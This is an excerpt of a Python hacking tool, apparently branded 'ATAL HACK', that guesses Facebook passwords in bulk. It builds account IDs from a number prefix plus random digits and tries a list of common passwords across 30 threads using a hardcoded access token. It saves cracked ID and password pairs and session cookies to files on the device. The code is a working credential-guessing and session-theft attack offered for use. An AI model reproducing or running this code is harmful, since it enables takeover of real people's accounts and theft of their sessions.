...
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mFACEBOOK   \033[1;31m┇\033[37;41m{😘ALHAMODEEN ATAL & VISAL😘 }\33[0;m        
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mGITHUB    \033[1;31m ┇\033[1;37m{☠️ATAL HACK☠️ 907}\33[0;m              
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mYOUTUBE   \033[1;31m ┇\033[1;37m{☠️ATAL HACK☠️ 907}\33[0;m      
...
\033[1;31m====================================================
\33[37;41m\t WELLCOME TO 💰ALHAMODEEN ATAL💰 TOOLS\33[0;m
...
def AFG():
		user=[]
		clear()
		print('\033[1;35m Code example: 9379,9378,9377,9370,9376')
		code = input('\033[1;37m PUT CODE: ')
		try:
			limit = int(input('\033[1;35m example: 50,100,1000,2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT: '))
		except ValueError:
			limit = 5000
		clear()
		print('\033[1;32m \n [1] \033[1;33mMethod Beast 🥰')
		linex()
		mthd = input(' Choose: ')
		clear()
		...
		with tred(max_workers=30) as FKING:	
			...
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'۱۲۳۴۵۶','100200','500500','700800','900900','10002000','50006000','kabul123','Afghan1234','kabul1234','afghanistan','Afghanistan','first123','last123','first1234','last1234','first12345','last12345','jan123','khan12345','khan1234','Khan123','50005000']
...
def fking1(ids,passlist):
        ...
        try:
                for pas in passlist:
                        accessToken = 'EAAGNO4a7r2wBO9ox4QvYImjN5gaFzkSNTMLDW10PZBBmWVqBuQPmiVtKLKDstCNqfZAi9OnyX0FawgXHZCSmEemBQxBZBGMsdnabZCyZBBD5gLCFjmaWPZAn7CJqgsMoVi9abw9cVZBTuJmGEx941klkbpxKrJ0dxNvS6fNLHoSEgZBIJ1MJahbAsVfdm47ZBM4fzU7AZDZD'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[31;47m [ATAL==>☠️OK]\33[0;m\033[1;32m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
                                        open('/sdcard/A-ATAL-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/A-ATAL-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print("")
                                        open('/sdcard/A-ATAL-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
